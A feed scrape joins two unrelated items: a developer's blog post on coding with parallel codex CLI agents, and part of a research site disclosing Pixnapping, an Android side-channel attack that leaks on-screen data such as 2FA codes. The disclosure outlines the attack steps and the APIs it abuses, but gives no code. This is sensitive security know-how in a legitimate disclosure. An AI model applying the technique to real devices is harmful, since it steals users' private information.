<p>I work by myself, current project is a ~300k LOC TypeScript React app, a Chrome extension, a cli, a client app in Tauri and a mobile app in Expo. I host on vercel, a PR delivers a new version of my website in ~2 minutes to test. Everything else (apps etc) is not automated.</p>
<h2 id="harness--general-approach">Harness &amp; General Approach</h2>
<p>I’ve completely moved to <code>codex</code> cli as daily driver. I run between 3-8 in parallel in a 3x3 terminal grid, most of them <a href="https://x.com/steipete/status/1977771686176174352">in the same folder</a>, some experiments go in separate folders. I experimented with worktrees, PRs but always revert back to this setup as it gets stuff done the fastest.</p>
<p>My agents do git <a href="https://x.com/steipete/status/1977498385172050258">atomic commits</a> themselves. In order to maintain a mostly clean commit history, I iterated a lot on <a href="https://gist.github.com/steipete/d3b9db3fa8eb1d1a692b7656217d8655">my agent file</a>. This makes git ops sharper so each agent commits exactly the files it edited.</p>
<p>Yes, with claude you could do hooks and codex doesn’t support them yet, but models are incredibly clever and <a href="https://x.com/steipete/status/1977119589860601950">no hook will stop them</a> if they are determined.</p>
<p>I was being ridiculed in the past and called a <a href="https://x.com/weberwongwong/status/1975749583079694398">slop-generator</a>, good to see that running parallel agents <a href="https://x.com/steipete/status/1976353767705457005">slowly gets mainstream</a>.</p>
<h2 id="model-picker">Model Picker</h2>
<p>I build pretty much everything with gpt-5-codex on mid settings. It’s a great compromise of smart &amp; speed, and dials thinking up/down automatically. I found over-thinking these settings to not yield meaningful results, and it’s nice not having to think about <em>ultrathink</em>.</p>
<h3 id="blast-radius">Blast Radius 💥</h3>
<p>Whenever I work, I think about the “blast radius”. I didn’t come up with that term, I do love it tho. When I think of a change I have a pretty good feeling about how long it’ll take and how many files it will touch. I can throw many small bombs at my codebase or a one “Fat Man” and a few small ones. If you throw multiple large bombs, it’ll be impossible to do isolated commits, much harder to reset if sth goes wrong.</p>
<p>This is also a good indicator while I watch my agents. If something takes longer than I anticipated, I just hit escape and ask “what’s the status” to get a status update and then either help the model to find the right direction, abort or continue. Don’t be afraid of stopping models mid-way, file changes are atomic and they are really good at picking up where they stopped.</p>
<p>When I am unsure about the impact, I use “give me a few options before making changes” to gauge it.</p>
<h3 id="why-not-worktrees">Why not worktrees?</h3>
<p>I run one dev server, as I evolve my project I click through it and test multiple changes at once. Having a tree/branch per change would make this significantly slower, spawning multiple dev servers would quickly get annoying. I also have limitations for Twitter OAuth, so I can only register some domains for callbacks.</p>
<h3 id="what-about-claude-code">What about Claude Code?</h3>
<p>I used to love Claude Code, these days I can’t stand it anymore (<a href="https://x.com/steipete/status/1977072732136521836">even tho codex is a fan</a>). It’s language, the <a href="https://x.com/vtahowe/status/1976709116425871772">absolutely right’s</a>, the 100% production ready messages while tests fail - I just can’t anymore. Codex is more like the introverted engineer that chugs along and just gets stuff done. It reads much more files before starting work so even small prompts usually do exactly what I want.</p>
<p>There’s broad consensus in my timeline that <a href="https://x.com/s_streichsbier/status/1974334735829905648">codex is the way</a> <a href="https://x.com/kimmonismus/status/1976404152541680038">to go</a>.</p>
<h3 id="other-benefits-of-codex">Other benefits of codex</h3>
<ul>
<li><strong>~230k usable context vs claude’s 156k.</strong> Yes, there’s Sonnet 1Mio if you get lucky or pay API pricing, but realistically Claude gets very silly long before it depletes that context so it’s not realistically something you can use.</li>
<li><strong>More efficient token use.</strong> Idk what OpenAI does different, but my context fills up far slower than with Claude Code. I used to see Compacting… all the time when using claude, I very rarely manage to exceed the context in codex.</li>
<li><strong>Message Queuing.</strong> Codex allows to <a href="https://x.com/steipete/status/1978099041884897517">queue messages</a>. Claude had this feature, but a few months ago they changed it so your messages “steer” the model. If I want to steer codex, I just press escape and enter to send the new message. Having the option for both is just far better. I often queue related feature tasks and it just reliably works them off.</li>
<li><strong>Speed</strong> OpenAI rewrote codex in Rust, and it shows. It’s incredibly fast. With Claude Code I often have multi-second freezes and it’s process blows up to gigabytes of memory. And then there’s the terminal flickering, especially when using Ghostty. Codex has none of that. It feels incredibly lightweight and fast.</li>
<li><strong>Language.</strong> <a href="https://x.com/steipete/status/1975297275242160395">This really makes a difference to my mental health.</a> I’ve been screaming at claude so many times. I rarely get angry with codex. Even if codex would be a worse model I’d use it for that fact alone. If you use both for a few weeks you will understand.</li>
<li><a href="https://x.com/steipete/status/1977466373363437914">No random markdown files everywhere</a>. <a href="https://x.com/deepfates/status/1975604489634914326">IYKYK</a>.</li>
</ul>
<h3 id="why-not-harness">Why not $harness</h3>
<p>IMO there’s simply not much space between the end user and the model company. I get by far the best deal using a subscription. I currently have 4 OpenAI subs and 1 Anthropic sub, so my overall costs are around 1k/month for basically unlimited tokens. If I’d use API calls, that’d cost my around 10x more. Don’t nail me on this math, I used some token counting tools like ccusage and it’s all somewhat imprecise, but even if it’s just 5x it’s a damn good deal.</p>
<p>I like that we have tools like amp or Factory, I just don’t see them surviving long-term. Both codex and claude code are getting better with every release, and they all converge to the same ideas and feature set. Some might have a temporary edge with better todo lists, steering or slight dx features, but I don’t see them significantly out-competing the big AI companies.</p>
<p>amp moved away from GPT-5 as driver and now calls it their <a href="https://ampcode.com/news/gpt-5-oracle">“oracle”</a>. Meanwhile I use codex and basically constantly work with the smarter model, the oracle. <a href="https://x.com/btibor91/status/1976299256383250780">Yes, there are benchmarks</a>, but given the skewed usage numbers, I don’t trust them. codex gets me far better results than amp. I have to give them kudos tho for session sharing, they push some interesting ideas ahead.</p>
<p>Factory, unconvinced. Their videos are a bit cringe, I do hear good things in my timeline about it tho, even if images aren’t supported (yet) and they have the <a href="https://x.com/badlogicgames/status/1977103325192667323">signature flicker</a>.</p>
<p>Cursor… it’s tab completion model is industry leading, if you still write code yourself. I use VS Code mostly, I do like them pushing things like browser automation and plan mode tho. I did experiment with GPT-5-Pro but <a href="https://x.com/steipete/status/1976226900516209035">Cursor still has the same bugs that annoyed me back in May</a>. I hear that’s being worked on tho, so it stays in my dock.</p>
<p>Others like Auggie were a blip on my timeline and nobody ever mentioned them again. In the end they all wrap either GPT-5 and/or Sonnet and are replaceable. RAG might been helpful for Sonnet, but GPT-5 is so good at searching at you don’t need a separate vector index for your code.</p>
<p>The most promising candidates are opencode and crush, esp. in combination with open models. You can totally use your OpenAI or Anthropic sub with them as well (<a href="https://x.com/steipete/status/1977286197375647870">thanks to clever hax</a>), but it’s questionable if that is allowed, and what’s the point of using a less capable harness for the model optimized for codex or Claude Code.</p>
<h3 id="what-about-openmodel">What about $openmodel</h3>
<p>I keep an eye on China’s open models, and it’s impressive how quickly they catch up. GLM 4.6 and Kimi K2.1 are strong contenders that slowly reach Sonnet 3.7 quality, I don’t recommend them as <a href="https://x.com/imfeat7/status/1977246145278583258">daily driver</a> tho.</p>
<p>The benchmarks only tell half the story. IMO agentic engineering moved from “this is crap” to “this is good” around May with the release of Sonnet 4.0, and we hit an even bigger leap from good to “this is amazing” with gpt-5-codex.</p>
<h3 id="plan-mode--approach">Plan Mode &amp; Approach</h3>
<p>What benchmarks miss is the strategy that the model+harness pursue when they get a prompt. codex is far FAR more careful and reads much more files in your repo before deciding what to do. <a href="https://x.com/thsottiaux/status/1975565380388299112">It pushes back harder when you make a silly request.</a> Claude/other agents are much more eager and just try <em>something</em>. This can be mitigated with plan mode and rigorous structure docs, to me that feels like working around a broken system.</p>
<p>I rarely use big plan files now with codex. codex doesn’t even have a dedicated plan mode - however it’s so much better at adhering to the prompt that I can just write “let’s discuss” or “give me options” and it will diligently wait until I approve it. No harness charade needed. Just talk to it.</p>
<h3 id="but-claude-code-now-has-plugins">But Claude Code now has <a href="https://www.anthropic.com/news/claude-code-plugins">Plugins</a></h3>
<p>Do you hear that noise in the distance? It’s me sigh-ing. What a big pile of bs. This one really left me disappointed in Anthropic’s focus. They try to patch over inefficiencies in the model. Yes, maintaining good documents for specific tasks is a good idea. I keep a big list of useful docs in a docs folder as markdown.</p>
<h3 id="but-but-subagents-1">But but Subagents !!!1!</h3>
<p>But something has to be said about this whole dance with subagents. Back in May this was called subtasks, and mostly a way to spin out tasks into a separate context when the model doesn’t need the full text - mainly a way to parallelize or to reduce context waste for e.g. noisy build scripts. Later they rebranded and improved this to subagents, so you spin of a task with some instructions, nicely packaged.</p>
<p>The use case is the same. What others do with subagents, I usually do with separate windows. If I wanna research sth I might do that in a separate terminal pane and paste it to another one. This gives me complete control and visibility over the context I engineer, unlike subagents who make it harder to view and steer or control what is sent back.</p>
<p>And we have to talk about the subagent Anthropic recommends on their blog. Just look at this <a href="https://github.com/wshobson/agents/blob/main/plugins/llm-application-dev/agents/ai-engineer.md">“AI Engineer” agent</a>. It’s an amalgamation of slop, mentioning GPT-4o and o1 for integration, and overall just seems like an autogenerated soup of words that tries to make sense. There’s no meat in there that would make your agent a better “AI engineer”.</p>
<p>What does that even mean? If you want to get better output, telling your model “You are an AI engineer specializing in production-grade LLM applications” will not change that. Giving it documentation, examples and do/don’t helps. I bet that you’d get better result if you ask your agent to “google AI agent building best practices” and let it load some websites than this crap. You could even make the argument that this slop is <a href="https://x.com/IanIsSoAwesome/status/1976662563699245358">context poison</a>.</p>
<h2 id="how-i-write-prompts">How I write prompts</h2>
<p>Back when using claude, I used to write (ofc not, <a href="https://x.com/steipete/status/1978104202820812905">I speak</a>) very extensive prompts, since this model “gets me” the more context I supply. While this is true with any model, I noticed that my prompts became significantly shorter with codex. Often it’s just 1-2 sentences + <a href="https://x.com/steipete/status/1977175451408990379">an image</a>. The model is incredibly good at reading the codebase and just gets me. I even sometimes go back to typing since codex requires so much less context to understand.</p>
<p>Adding images is an amazing trick to provide more context, the model is really good at finding exactly what you show, it finds strings and matches it and directly arrives at the place you mention. I’d say at least 50% of my prompts contain a screenshot. I rarely annotate that, that works even better but is slower. A screenshot takes 2 seconds to drag into the terminal.</p>
<p><a href="https://wisprflow.ai/">Wispr Flow</a> with semantic correction is still king.</p>
<h2 id="web-based-agents">Web-Based Agents</h2>
<p>Lately I experimented again with web agents: Devin, Cursor and Codex. Google’s Jules looks nice but was really annoying to set up and Gemini 2.5 just isn’t a good model anymore. Things might change soon once we get <a href="https://x.com/cannn064/status/1973415142302830878">Gemini 3 Pro</a>. The only one that stuck is codex web. It also is annoying to setup and broken, the terminal currently <a href="https://x.com/steipete/status/1974798735055192524">doesn’t load correctly</a>, but I had an older version of my environment and made it work, with the price of slower wramp-up times.</p>
<p>I use codex web as my short-term issue tracker. Whenever I’m on the go and have an idea, I do a one-liner via the iOS app and later review this on my Mac. Sure, I could do way more with my phone and even review/merge this, but I choose not to. My work is already addictive enough as-is, so when I’m out or seeing friends, I don’t wanna be pulled in even more. Heck, I say this as someone <a href="https://steipete.me/posts/2025/vibetunnel-first-anniversary">who spent almost two months building a tool to make it easier to code on your phone</a>.</p>
<p>Codex web didn’t even count towards your usage limits, but <a href="https://x.com/steipete/status/1976292221390553236">these days sadly are numbered</a>.</p>
<h2 id="the-agentic-journey">The Agentic Journey</h2>
<p>Let’s talk about tools. <a href="https://conductor.build/">Conductor</a>, <a href="https://www.terragonlabs.com/">Terragon</a>, <a href="https://x.com/steipete/status/1973132707707113691">Sculptor</a> and the 1000 other ones. Some are hobby projects, some are drowning in VC money. I tried so many of them. None stick. IMO they work around current inefficiencies and promote a workflow that just isn’t optimal. Plus, most of them hide the terminal and don’t show everything the model shows.</p>
<p>Most are thin wrappers around Anthropic’s SDK + work tree management. There’s no moat. And I question if you even want easier access to coding agents on your phone. The little use case these did for me, codex web fully covers.</p>
<p>I do see this pattern tho that almost every engineer goes through a phase of building their own tools, mostly because it’s fun and because it’s so much easier now. And what else to build than tools that (we think) will make it simpler to build more tools?</p>
<h2 id="but-claude-code-can-background-tasks">But Claude Code can Background Tasks!</h2>
<p>True. codex currently lacks a few bells and whistles that claude has. The most painful omission is background task management. While it should have a timeout, I did see it get stuck quite a few times with cli tasks that don’t end, like spinning up a dev server or tests that deadlock.</p>
<p>This was one of the reasons I reverted back to claude, but since that model is just so silly in other ways, I now use <a href="https://x.com/steipete/status/1977745596380279006"><code>tmux</code></a>. It’s an old tool to run CLIs in persistent sessions in the background and there’s plenty world knowledge in the model, so all you need to do is “run via tmux”. No custom agent md charade needed.</p>
<h2 id="what-about-mcps">What about MCPs</h2>
<p>Other people wrote plenty about MCPs. IMO most are something for the marketing department to make a checkbox and be proud. Almost all MCPs really should be clis. I say that as someone <a href="https://github.com/steipete/claude-code-mcp">who wrote 5 MCPs myself</a>.</p>
<p>I can just refer to a cli by name. I don’t need any explanation in my agents file. The agent will try $randomcrap on the first call, the cli will present the help menu, context now has full info how this works and from now on we good. I don’t have to pay a price for any tools, unlike MCPs which are a constant cost and garbage in my context. Use GitHub’s MCP and see 23k tokens gone. Heck, they did make it better because it was almost 50.000 tokens when it first launched. Or use the <code>gh</code> cli which has basically the same feature set, models already know how to use it, and pay zero context tax.</p>
<p>I did open source some of my cli tools, like <a href="https://github.com/steipete/bslog">bslog</a> and <a href="https://github.com/steipete/inngest">inngest</a>.</p>
<p>I do use <a href="https://developer.chrome.com/blog/chrome-devtools-mcp"><code>chrome-devtools-mcp</code></a> these days <a href="https://x.com/steipete/status/1977762275302789197">to close the loop</a>. it replaced Playwright as my to-go MCP for web debugging. I don’t need it lots but when I do, it’s quite useful to close the loop. I designed my website so that I can create api keys that allow my model to query any endpoint via curl, which is faster and more token-efficient in almost all use cases, so even that MCP isn’t something I need daily.</p>
<h2 id="but-the-code-is-slop">But the code is slop!</h2>
<p>I spend about <a href="https://x.com/steipete/status/1976985959242907656">20% of my time</a> on refactoring. Ofc all of that is done by agents, I don’t waste my time doing that manually. Refactor days are great when I need less focus or I’m tired, since I can make great progress without the need of too much focus or clear thinking.</p>
<p>Typical refactor work is using <code>jscpd</code> for code duplication, <a href="https://knip.dev/"><code>knip</code></a> for dead code, running <code>eslint</code>’s <code>react-compiler</code> and deprecation plugins, checking if we introduced api routes that can be consolidated, maintaining my docs, breaking apart files that grew too large, adding tests and code comments for tricky parts, updating dependencies, <a href="https://x.com/steipete/status/1977472427354632326">tool upgrades</a>, file restructuring, finding and rewriting slow tests, mentioning modern react patterns and rewriting code (e.g. <a href="https://react.dev/learn/you-might-not-need-an-effect">you might not need <code>useEffect</code></a>). There’s always something to do.</p>
<p>You could make the argument that this could be done on each commit, I do find these phases of iterating fast and then maintaining and improving the codebase - basically paying back some technical debt, to be far more productive, and overall far more fun.</p>
<h2 id="do-you-do-spec-driven-development">Do you do spec-driven development?</h2>
<p><a href="https://steipete.me/posts/2025/the-future-of-vibe-coding">I used to back in June</a>. Designing a big spec, then let the model build it, ideally for hours. IMO that’s the old way of thinking about building software.</p>
<p>My current approach is usually that I start a discussion with codex, I paste in some websites, some ideas, ask it to read code, and we flesh out a new feature together. If it’s something tricky, I ask it to write everything into a spec, give that to GPT-5-Pro for review (via chatgpt.com) to see if it has better ideas (surprisingly often, this greatly improves my plan!) and then paste back what I think is useful into the main context to update the file.</p>
<p>By now I have a good feeling which tasks take how much context, and codex’s context space is quite good, so often I’ll just start building. Some people are religious and always use a new context with the plan - IMO that was useful for Sonnet, but GPT-5 is far better at dealing with larger contexts, and doing that would easily add 10 minutes to everything as the model has to slowly fetch all files needed to build the feature again.</p>
<p>The far more fun approach is when I do UI-based work. I often start with sth simple and woefully under-spec my requests, and watch the model build and see the browser update in real time. Then I queue in additional changes and iterate on the feature. Often I don’t fully know how something should look like, and that way I can play with the idea and iterate and see it slowly come to life. I often saw codex build something interesting I didn’t even think of. I don’t reset, I simply iterate and morph the chaos into the shape that feels right.</p>
<p>Often I get ideas for related interactions and iterate on other parts as well while I build it, that work I do in a different agent. Usually I work on one main feature and some smaller, tangentially related tasks.</p>
<p>As I’m writing this, I build a new Twitter data importer in my Chrome extension, and for that I reshape the graphql importer. Since I’m a bit unsure if that is the right approach, that one is in a separate folder so I can look at the PR and see if that approach makes sense. The main repo does refactoring, so I can focus on writing this article.</p>
<h2 id="show-me-your-slash-commands">Show me your slash commands!</h2>
<p>I only have a few, and I use them rarely:</p>
<ul>
<li><code>/commit</code> (custom text to explain that multiple agents work in the same folder and to only commit your changes, so I get clean comments and gpt doesn’t freak out about other changes and tries to revert things if linter fails)</li>
<li><code>/automerge</code> (process one PR at a time, react to bot comments, reply, get CI green and squash when green)</li>
<li><code>/massageprs</code> (same as automerge but without the squashing so I can parallelize the process if I have a lot of PRs)</li>
<li><code>/review</code> (built-in, only sometimes since I have review bots on GH, but can be useful)</li>
</ul>
<p>And even with these, usually I just type “commit”, unless I know that there’s far too many dirty files and the agent might mess up without some guidance. No need for charade/context waste when I’m confident that this is enough. Again, you develop intuition for these. I have yet to see other commands that really are useful.</p>
<h2 id="what-other-tricks-do-you-have">What other tricks do you have?</h2>
<p>Instead of trying to formulate the perfect prompt to motivate the agent to continue on a long-running task, there’s lazy workarounds. If you do a bigger refactor, codex often stops with a mid-work reply. <a href="https://x.com/steipete/status/1978099041884897517"><strong>Queue up continue messages</strong></a> if you wanna go away and just see it done. If codex is done and gets more messages, <a href="https://x.com/steipete/status/1978111714685063640">it happily ignores them</a>.</p>
<p>Ask the model to <strong>write tests after each feature/fix</strong> is done. Use the same context. This will lead to far better tests, and likely uncover a bug in your implementation. If it’s purely a UI tweak, tests likely make less sense, but for anything else, do it. AI generally is bad at writing good tests, it’s still helpful tho, and let’s be honest - are you writing tests for every fix you make?</p>
<p>Ask the model to <strong>preserve your intent</strong> and “add code comments on tricky parts” helps both you and future model runs.</p>
<p>When things get hard, prompting and <strong>adding some trigger words</strong> like “take your time” “comprehensive” “read all code that could be related” “create possible hypothesis” makes codex solve even the trickiest problems.</p>
<h2 id="how-does-your-agentsclaude-file-look-like">How does your Agents/Claude file look like?</h2>
<p>I have an Agents.md file with a symlink to claude.md, since Anthropic decided not to standardize. I recognize that this is difficult and sub-optimal, since <a href="https://cookbook.openai.com/examples/gpt-5/gpt-5_prompting_guide">GPT-5 prefers quite different prompting</a> than Claude. Stop here and read their prompting guide if you haven’t yet.</p>
<p>While Claude reacts well to <a href="https://x.com/Altimor/status/1975752110164578576">🚨 SCREAMING ALL-CAPS 🚨 commands</a> that threaten it that it will imply ultimate failure and 100 kittens will die if it runs command X, that freaks out GPT-5. (Rightfully so). So drop all of that and just use words like a human. That also means that these files can’t optimally be shared. Which isn’t a problem to me since I mostly use codex, and accept that the instructions might be too weak for the rare instances where claude gets to play.</p>
<p>My Agent file is currently ~800 lines long and feels like a collection of organizational scar tissue. I didn’t write it, codex did, and anytime sth happens I ask it to make a concise note in there. I should clean this up at some point, but despite it being large it works incredibly well, and gpt really mostly honors entries there. At least it does far far more often than Claude ever did. (Sonnet 4.5 got better there, to give them some credit)</p>
<p>Next to git instruction it contains an explanation about my product, common naming and API patterns I prefer, notes about React Compiler - often it’s things that are newer than world knowledge because my tech stack is quite bleeding edge. I expect that I can again reduce things in there with model updates. For example, Sonnet 4.0 really needed guidance to understand Tailwind 4, Sonnet 4.5 and GPT-5 are newer and know about that version so I was able to delete all that fluff.</p>
<p>Significant blocks are about which React patterns I prefer, database migration management, testing, <a href="https://x.com/steipete/status/1963411717192651154">using and writing ast-grep rules</a>. (If you don’t know or don’t use ast-grep as codebase linter, stop here and ask your model to set this up as a git hook to block commits)</p>
<p>I also experimented and started using <a href="https://x.com/steipete/status/1973838406099874130">a text-based “design system”</a> for how things should look, the verdict is still out on that one.</p>
<h2 id="so-gpt-5-codex-is-perfect">So GPT-5-Codex is perfect?</h2>
<p>Absolutely not. Sometimes it refactors for half an hour and then <a href="https://x.com/steipete/status/1973834765737603103">panics</a> and reverts everything, and you need to re-run and soothen it like a child to tell it that it has enough time. Sometimes it forgets that it can do <a href="https://x.com/steipete/status/1977695411436392588">bash commands</a> and it requires some encouragement. Sometimes it replies <a href="https://x.com/steipete/status/1976207732534300940">in russian or korean</a>. <a href="https://x.com/steipete/status/1974108054984798729">Sometimes the monster slips and sends raw thinking to bash.</a> But overall these are quite rare and it’s just so insanely good in almost everything else that I can look past these flaws. Humans aren’t perfect either.</p>
<p>My biggest annoyance with codex is that it “loses” lines, so scrolling up quickly makes parts of the text disappear. I really hope this is on top of OpenAI’s bug roster, as it’s the main reason I sometimes have to slow down, so messages don’t disappear.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Don’t waste your time on stuff like RAG, subagents, <a href="https://x.com/steipete/status/1977660298367766766">Agents 2.0</a> or other things that are mostly just charade. Just talk to it. Play with it. Develop intuition. The more you work with agents, the better your results will be.</p>
<p><a href="https://simonwillison.net/2025/Oct/7/vibe-engineering/">Simon Willison’s article makes an excellent point</a> - many of the skills needed to manage agents are similar to what you need when <a href="https://x.com/lukasz_app/status/1974424549635826120">managing engineers</a> - almost all of these are characteristics of senior software engineers.</p>
<p>And yes, <a href="https://x.com/svpino/status/1977396812999688371">writing good software is still hard</a>. Just because I don’t write the code anymore doesn’t mean I don’t think hard about architecture, system design, dependencies, features or how to delight users. Using AI simply means that expectations what to ship went up.</p>
<p>PS: This post is 100% organic and hand-written. I love AI, I also recognize that some things are just better done the <a href="https://x.com/Alphafox78/status/1975679120898965947">old-fashioned</a> way. Keep the typos, keep my voice. <a href="https://x.com/rohanpaul_ai/status/1977005259567595959">🚄✌️</a></p>
<p>PPS: Credit for the header graphic goes to <a href="https://x.com/thorstenball/status/1976224756669309195">Thorsten Ball</a>.</p> </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pixnapping Attack (266 pts)]]></title>
            <link>https://www.pixnapping.com/</link>
            <guid>45588594</guid>
            <pubDate>Wed, 15 Oct 2025 06:05:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pixnapping.com/">https://www.pixnapping.com/</a>, See on <a href="https://news.ycombinator.com/item?id=45588594">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>

        <p>Pixnapping is a new class of attacks that allows a malicious Android app to stealthily leak information displayed by other Android apps or arbitrary websites.
Pixnapping exploits Android APIs and a hardware side channel that affects nearly all modern Android devices.
We have demonstrated Pixnapping attacks on Google and Samsung phones and end-to-end recovery of sensitive data from websites including Gmail and Google Accounts and apps including Signal, Google Authenticator, Venmo, and Google Maps.
Notably, our attack against Google Authenticator allows any malicious app to steal 2FA codes in under 30 seconds while hiding the attack from the user.</p>
<h2 id="demo-video">Demo video</h2>
<p>
  <video src="https://www.pixnapping.com/demo.mp4" controls="">Your browser does not support the video tag.</video>
</p>
<h2 id="research-paper">Research paper</h2>
<p>The Pixnapping paper will appear in the 32nd ACM Conference on Computer and Communications Security (Taipei, Taiwan; October  13-17, 2025) with the following title:</p>
<ul>
<li>Pixnapping: Bringing Pixel Stealing out of the Stone Age</li>
</ul>
<p>You can download a <a href="https://www.pixnapping.com/pixnapping.pdf">preprint</a> of the paper and cite it via this <a href="https://www.pixnapping.com/pixnapping.bib">BibTeX citation</a>.</p>
<p>The paper is the result of a collaboration between the following researchers:</p>
<ul>
<li><a href="https://urd00m.github.io/">Alan Wang</a> (University of California, Berkeley)</li>
<li><a href="https://www.linkedin.com/in/pranavvv">Pranav Gopalkrishnan</a> (University of Washington)</li>
<li><a href="https://www.cs.utexas.edu/~yingchen/">Yingchen Wang</a> (University of California, Berkeley)</li>
<li><a href="https://cwfletcher.github.io/">Christopher Fletcher</a> (University of California, Berkeley)</li>
<li><a href="https://www.cs.utexas.edu/~hovav/">Hovav Shacham</a> (University of California, San Diego)</li>
<li><a href="https://homes.cs.washington.edu/~dkohlbre/">David Kohlbrenner</a> (University of Washington)</li>
<li><a href="https://www.cs.cmu.edu/~rpaccagn/">Riccardo Paccagnella</a> (Carnegie Mellon University)</li>
</ul>
<h2 id="questions-and-answers">Questions and answers</h2>
<h3 id="what-devices-are-affected">What devices are affected?</h3>
<p>We instantiated Pixnapping on five devices running Android versions 13 to 16 (up until build id BP3A.250905.014): Google Pixel 6, Google Pixel 7, Google Pixel 8, Google Pixel 9, and Samsung Galaxy S25.</p>
<p>We have not confirmed if Android devices from other vendors are affected by Pixnapping.
However, the core mechanisms enabling the attack are typically available in all Android devices.</p>
<h3 id="what-are-the-attack-requirements">What are the attack requirements?</h3>
<p>Any running Android app can mount this attack, even if it does not have any Android permissions (i.e., no permissions are specified in its manifest file).</p>
<h3 id="what-information-does-the-attack-steal">What information does the attack steal?</h3>
<p>Anything that is visible when the target app is opened can be stolen by the malicious app using Pixnapping.
Chat messages, 2FA codes, email messages, etc. are all vulnerable since they are visible.</p>
<p>If an app has secret information that is <em>not</em> visible (e.g., it has a secret key that is stored but never shown on the screen), that information cannot be stolen by Pixnapping.</p>
<h3 id="is-pixnapping-being-used-in-the-wild">Is Pixnapping being used in the wild?</h3>
<p>We do not know.</p>
<h3 id="i-am-a-user-how-can-i-protect-myself">I am a user. How can I protect myself?</h3>
<p>Make sure to install Android patches as soon as they become available.</p>
<h3 id="i-am-an-app-developer-how-do-i-protect-my-users">I am an app developer. How do I protect my users?</h3>
<p>We are not aware of mitigation strategies to protect apps against Pixnapping.
If you have any insights into mitigations, please let us know and we will update this section.</p>
<h3 id="how-does-pixnapping-work">How does Pixnapping work?</h3>
<p>The three steps a malicious app can use to mount a Pixnapping attack are:</p>
<ol>
<li>
<p>Invoking a target app (e.g., Google Authenticator) to cause sensitive information to be submitted for rendering.
This step is described in Section 3.1 of <a href="https://www.pixnapping.com/paper">the paper</a>.</p>
</li>
<li>
<p>Inducing graphical operations on individual sensitive pixels rendered by the target app (e.g., the pixels that are part of the screen region where a 2FA character is known to be rendered by Google Authenticator).
This step is described in Section 3.2 of <a href="https://www.pixnapping.com/paper">the paper</a>.</p>
</li>
<li>
<p>Using a side channel (e.g., <a href="https://www.hertzbleed.com/gpu.zip/">GPU.zip</a>) to steal the pixels operated on during Step 2, one pixel at a time.
This step is described in Section 3.3 of <a href="https://www.pixnapping.com/paper">the paper</a>.</p>
</li>
</ol>
<p>Steps 2 and 3 are repeated for as many pixels as needed to run OCR over the recovered pixels and recover the original content.
Conceptually, it is as if the malicious app was taking a screenshot of screen contents it should not have access to.</p>
<h3 id="what-android-apis-does-pixnapping-exploit">What Android APIs does Pixnapping exploit?</h3>
<p>Pixnapping forces sensitive pixels into the rendering pipeline and overlays semi-transparent activities on top of those pixels via Android intents.
To induce graphical operations on these pixels, our instantiations use Android’s window blur API.
To measure rendering time, our instantiations use VSync callbacks.
For a more detailed explanation, we refer to <a href="https://www.pixnapping.com/pixnapping.pdf">the paper</a>.</p>
<h3 id="does-google-plan-to-patch-these-apis">Does Google plan to patch these APIs?</h3>
<p>Google has attempted to patch Pixnapping <a href="https://android.googlesource.com/platform/frameworks/native/+/20465375a1d0cb71cdb891235a9f8a3fba31dbf6">by limiting the number of activities an app can invoke blur on</a>.
However, we discovered a workaround to make Pixnapping work despite this patch.
The workaround is still under embargo.</p>
<h3 id="what-hardware-side-channel-does-pixnapping-exploit">What hardware side channel does Pixnapping exploit?</h3>
<p>Pixnapping relies on the <a href="https://www.hertzbleed.com/gpu.zip/">GPU.zip</a> side channel to leak pixels.</p>
<h3 id="do-gpu-vendors-plan-to-patch-the-hardware-side-channel">Do GPU vendors plan to patch the hardware side channel?</h3>
<p>As of October 2025, no GPU vendor has committed to patching GPU.zip.</p>
<h3 id="is-there-an-assigned-cve-for-pixnapping">Is there an assigned CVE for Pixnapping?</h3>
<p>Yes. Pixnapping is tracked under <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48561">CVE-2025-48561</a> in the Common Vulnerabilities and Exposures (CVE) system.</p>
<h3 id="are-other-operating-systems-affected-by-pixnapping">Are other operating systems affected by Pixnapping?</h3>
<p>Android is vulnerable to Pixnapping because it allows an app to:</p>
<ol>
<li>Send another app’s activities to the Android rendering pipeline (e.g., with intents).</li>
<li>Induce graphical operations (e.g., blur) on pixels displayed by another app’s activities.</li>
<li>Measure the pixel color-dependent side effects of graphical operations.</li>
</ol>
<p>We have not investigated the applicability of these properties on other platforms yet.</p>
<h3 id="what-is-the-app-list-bypass-vulnerability">What is the app list bypass vulnerability?</h3>
<p>It is another vulnerability we discovered that an app can use to determine if any other app is installed on the phone.
This information can be used to profile users.
Note that unlike prior app list bypass tricks (e.g., <a href="https://peabee.substack.com/p/everyone-knows-what-apps-you-use">[1]</a> and <a href="https://commonsware.com/blog/2020/04/05/android-r-package-visibility-holes.html">[2]</a>), nothing needs to be specified in the malicious app’s manifest file to exploit our app list bypass vulnerability.
For a more detailed explanation, we refer to Section 3.1 of <a href="https://www.pixnapping.com/pixnapping.pdf">the paper</a>.</p>
<h3 id="does-google-plan-to-patch-the-app-list-bypass-vulnerability">Does Google plan to patch the app list bypass vulnerability?</h3>
<p>As of October 2025, Google has not committed to patching our app list bypass vulnerability.
They resolved our report as “Won’t fix (Infeasible)”.</p>
<h3 id="can-i-use-the-logo">Can I use the logo?</h3>
<p>Yes. The Pixnapping logo is free to use under a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0</a> license.</p>
<ul>
<li>Download logo: <a href="https://www.pixnapping.com/images/Pixnapping-logo.svg">SVG</a>, <a href="https://www.pixnapping.com/images/Pixnapping-logo.png">PNG</a></li>
<li>Download logo with text: <a href="https://www.pixnapping.com/images/Pixnapping-logo-with-text.svg">SVG</a>, <a href="https://www.pixnapping.com/images/Pixnapping-logo-with-text.png">PNG</a></li>
</ul>
<h3 id="did-you-release-the-source-code-of-pixnapping">Did you release the source code of Pixnapping?</h3>
<p>We will release the source code at this link once patches become available: <a href="https://github.com/TAC-UCB/pixnapping">https://github.com/TAC-UCB/pixnapping</a></p>
<h2 id="timeline-and-news">Timeline and news</h2>
<div id="timeline">
      <div>
        <p>October 13, 2025</p><p>
        Google told <a href="https://www.theregister.com/2025/10/13/android_pixnapping_attack_captures_2fa_codes/">The Register</a> that they will be issuing an additional patch for Pixnapping in the December Android security bulletin
      </p></div>
      <div>
        <p>September 19, 2025</p><p>
        We disclosed to Samsung that Google's patch was insufficient to protect Samsung devices (from our original attack with no workaround)
